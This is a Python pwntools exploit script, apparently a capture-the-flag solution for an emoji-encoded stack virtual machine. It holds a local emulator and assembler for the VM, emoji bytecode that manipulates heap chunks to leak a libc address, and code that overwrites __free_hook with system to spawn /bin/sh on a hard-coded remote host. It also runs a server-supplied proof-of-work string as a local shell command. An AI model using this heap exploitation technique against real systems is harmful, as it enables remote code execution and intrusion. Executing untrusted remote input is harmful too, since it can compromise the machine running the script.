from pwn import *
import subprocess

###Translation Table
MI = {0x2796:3,0x2753:5,0x274c:4,0x23ec:0xd,0x274e:0x6,0x2795:0x2,0x1f4af:9,0x1f46b:7,0x1f233:1,0x1f195:0x11,0x1f193:0x12,0x1f21a:0xc,0x1f236:0xb,0x1f480:0x8,0x1f51d:0xe,0x1f4e4:0xf,0x1f4c4:0x13,0x1f4dd:0x14,0x1f4e5:0x10,0x1f522:0x16,0x1f521:0x15,0x1f680:0xa,0x1f6d1:0x17}
OI = {0x1f604:5,0x1f601:1,0x1f600:0,0x1f602:2,0x1f61c:4,0x1f606:7,0x1f605:6,0x1f60a:9,0x1f609:8,0x1f60d:0xa,0x1f923:3}
MINV = {}
OINV = {}
for i in MI.keys():
    MINV[MI[i]] = i
for i in OI.keys():
    OINV[OI[i]] = i


###Emulator
STACK = [0 for i in range(0x400)]
STORAGE = [[0 for i in range(0x5dc)] for j in range(10)]
STORAGE_SIZE=[-1 for i in range(10)]

def myexit():
    for i in range(10):
        print(STORAGE_SIZE[i],end='')
        if STORAGE_SIZE[i]!=-1:
            print(STORAGE[i][:STORAGE_SIZE[i]],end='')
        print()
    exit()

def run(code):
    code_ptr = 0
    stack_ptr = -1
    while True:
        i = code[code_ptr]
        if i==1:
            code_ptr+=1
        elif i==2:
            STACK[stack_ptr-1] += STACK[stack_ptr]
            stack_ptr-=1
            code_ptr+=1
        elif i==3:
            STACK[stack_ptr-1] = STACK[stack_ptr]-STACK[stack_ptr-1]
            stack_ptr-=1
            code_ptr+=1
        elif i==4:
            STACK[stack_ptr-1] = STACK[stack_ptr]*STACK[stack_ptr-1]
            stack_ptr-=1
            code_ptr+=1
        elif i==5:
            STACK[stack_ptr-1] = STACK[stack_ptr]%STACK[stack_ptr-1]
            stack_ptr-=1
            code_ptr+=1
        elif i==6:
            STACK[stack_ptr-1] = STACK[stack_ptr]^STACK[stack_ptr-1]
            stack_ptr-=1
            code_ptr+=1
        elif i==7:
            STACK[stack_ptr-1] = STACK[stack_ptr]&STACK[stack_ptr-1]
            stack_ptr-=1
            code_ptr+=1
        elif i==8:
            if STACK[stack_ptr]<STACK[stack_ptr-1]:
                STACK[stack_ptr-1]=1
            else:
                STACK[stack_ptr-1]=0
            stack_ptr-=1
            code_ptr+=1
        elif i==9:
            if STACK[stack_ptr]==STACK[stack_ptr-1]:
                STACK[stack_ptr-1]=1
            else:
                STACK[stack_ptr-1]=0
            stack_ptr-=1
            code_ptr+=1
        elif i==10:
            code_ptr = STACK[stack_ptr]
            stack_ptr-=1
        elif i==11:
            if STACK[stack_ptr-1]!=0:
                code_ptr = STACK[stack_ptr]
            else:
                code_ptr+=1
            stack_ptr-=2
        elif i==12:
            if STACK[stack_ptr-1]==0:
                code_ptr = STACK[stack_ptr]
            else:
                code_ptr+=1
            stack_ptr-=2
        elif i==13:
            if stack_ptr==0x400:
                print('stack overflow')
                myexit()
            else:
                stack_ptr+=1
                STACK[stack_ptr] = code[code_ptr+1]
                code_ptr+=2
        elif i==14:
            if stack_ptr!=-1:
                stack_ptr-=1
            else:
                print('stack underflow')
                myexit()
            code_ptr+=1
        elif i==15:
            idx1 = STACK[stack_ptr]
            idx2 = STACK[stack_ptr-1]
            if idx1<0 or idx1>=10 or idx2<0 or idx2>=STORAGE_SIZE[idx1]:
                print('Invalid storage index(retrieve)')
                myexit()
            else:
                STACK[stack_ptr-1] = STORAGE[idx1][idx2]
            stack_ptr-=1
            code_ptr+=1
        elif i==16:
            idx1 = STACK[stack_ptr]
            idx2 = STACK[stack_ptr-1]
            if idx1<0 or idx1>=10 or idx2<0 or idx2>=STORAGE_SIZE[idx1]:
                print('Invalid storage index(store)')
                myexit()
            else:
                STORAGE[idx1][idx2] = STACK[stack_ptr-2]
            stack_ptr-=3
            code_ptr+=1
        elif i==17:
            size = STACK[stack_ptr]
            if size>=0x5dc:
                print('Invalid size')
                myexit()
            for j in range(10):
                if STORAGE_SIZE[j]==-1:
                    STORAGE_SIZE[j]=size
                    break
            stack_ptr-=1
            code_ptr+=1
        elif i==18:
            idx1 = STACK[stack_ptr]
            if idx1<0 or idx1>=10 or STORAGE_SIZE[idx1]==-1:
                print('Invalid storage index(delete)')
                myexit()
            STORAGE_SIZE[idx1]=-1
            stack_ptr-=1
            code_ptr+=1
        elif i==19:
            idx1 = STACK[stack_ptr]
            if idx1<0 or idx1>=10 or STORAGE_SIZE[idx1]==-1:
                print('Invalid storage index(read)')
                myexit()
            inp = input()
            for j in range(STORAGE_SIZE[idx1]):
                STORAGE[idx1][j] = ord(inp[j])
            stack_ptr-=1
            code_ptr+=1
        elif i==20:
            idx1 = STACK[stack_ptr]
            if idx1<0 or idx1>=10 or STORAGE_SIZE[idx1]==-1:
                print('Invalid storage index(print)')
                myexit()
            for j in range(STORAGE_SIZE[idx1]):
                if STORAGE[idx1][j]==0:
                    break
                else:
                    print(chr(STORAGE[idx1][j]),end='')
            stack_ptr-=1
            code_ptr+=1
        elif i==21:
            while stack_ptr!=-1:
                C = STACK[stack_ptr]
                stack_ptr-=1
                if C==0:
                    break
                else:
                    print(chr(C),end='')
            code_ptr+=1
        elif i==22:
            print(chr(STACK[stack_ptr]),end='')
            stack_ptr-=1
            code_ptr+=1
        elif i==23:
            break
        else:
            print('Invalid command')
            myexit()

###Assembler
def Easm(assembly):
    assembly = assembly.split('\n')
    code = ''
    for i in assembly:
        i = i.strip()
        if i=='':
            continue
        elif '//' in i or ':' in i:
            continue
        else:
            if 'nop' in i:
                code+=chr(MINV[1])
            elif 'add' in i:
                code+=chr(MINV[2])
            elif 'sub' in i:
                code+=chr(MINV[3])
            elif 'mult' in i:
                code+=chr(MINV[4])
            elif 'mod' in i:
                code+=chr(MINV[5])
            elif 'xor' in i:
                code+=chr(MINV[6])
            elif 'and' in i:
                code+=chr(MINV[7])
            elif 'lt' in i:
                code+=chr(MINV[8])
            elif 'eq' in i:
                code+=chr(MINV[9])
            elif 'jmp' in i:
                code+=chr(MINV[10])
            elif 'jnz' in i:
                code+=chr(MINV[11])
            elif 'jz' in i:
                code+=chr(MINV[12])
            elif 'push' in i:
                code+=chr(MINV[13])
                code+=chr(OINV[int(i.split()[1])])
            elif 'pop' in i:
                code+=chr(MINV[14])
            elif 'extract' in i:
                code+=chr(MINV[15])
            elif 'store' in i:
                code+=chr(MINV[16])
            elif 'create' in i:
                code+=chr(MINV[17])
            elif 'delete' in i:
                code+=chr(MINV[18])
            elif 'read' in i:
                code+=chr(MINV[19])
            elif 'writestorange' in i:
                code+=chr(MINV[20])
            elif 'writestack' in i:
                code+=chr(MINV[21])
            elif 'writechr' in i:
                code+=chr(MINV[22])
            elif 'end' in i:
                code+=chr(MINV[23])
            else:
                print('invalid opcode',i)
                exit()
    return code

###Snippets
initialize = '''
            push 10
            create
            push 4
            push 4
            mult
            push 0
            push 0
            store
            '''

create_large = '''
            push 0
            push 0
            extract
            push 0
            push 0
            extract
            mult
            push 5
            mult
            create
            '''

create_small = '''
            push 4
            push 4
            mult
            create
            '''
def delete(idx):
    res = f'''
        push {idx}
        delete
        '''
    return res

def extract_offset(idx,offset):
    if offset<10:
        res = f'''
                push {offset}
                push {idx}
                extract
                '''
    elif offset<20:
        res = f'''
                push {10}
                push {offset-10}
                add
                push {idx}
                extract
                '''
    elif offset<100:
        res = f'''
                push {offset//10}
                push 10
                mult
                push {offset%10}
                add
                push {idx}
                extract
                '''
    return res

def read(idx):
    res = f'''
            push {idx}
            read
            '''
    return res

###Addr
#  libc2.27
main_arena_offset = 0x3ebc40
small_bin1_offset = main_arena_offset+0x70
free_hook_offset = 0x3ed8e8
system_offset = 0x4f440


###Exploit
emojicode = Easm(initialize+\
                 create_small+\
                 create_large+\
                 create_small*7+\
                 delete(2)+\
                 delete(9)+\
                 create_small+\
                 create_small+\
                 '''
                 push 8
                 push 8
                 mult
                 add
                 add
                 add
                 '''+\
                 '''
                 push 0
                 push 0
                 push 10
                 '''+\
                 ''.join([extract_offset(9,i) for i in range(37,31,-1)])+\
                 '''
                 writestack
                 '''+\
                 delete(2)+\
                 delete(1)+\
                 '''
                 push 0
                 push 0
                 extract
                 push 6
                 mult
                 push 8
                 add
                 sub
                 sub
                 sub
                 push 0
                 sub
                 '''+\
                 read(9)+\
                 '''
                 push 0
                 push 0
                 push 10
                 writestack
                 '''+\
                 create_small+\
                 create_small+\
                 read(2)+\
                 delete(2))


r = remote('3.115.176.164',30262)
r.recvline()
POW_prob = r.recvline()[:-1]
POW_res = subprocess.getoutput(POW_prob)
r.sendlineafter('hashcash token: ',POW_res)

r.sendlineafter('( MAX: 1000 bytes ) ',str(len(emojicode.encode())))
r.sendafter('Input your emoji file:\n',emojicode)

small_bin1_addr = u64(r.recvline()[:-1].ljust(0x8,b'\x00'))
libc_base = small_bin1_addr-small_bin1_offset
print(hex(libc_base))

r.send(p64(libc_base+free_hook_offset-8))
r.sendafter('\n',b'/bin/sh\x00'+p64(libc_base+system_offset))

r.interactive()
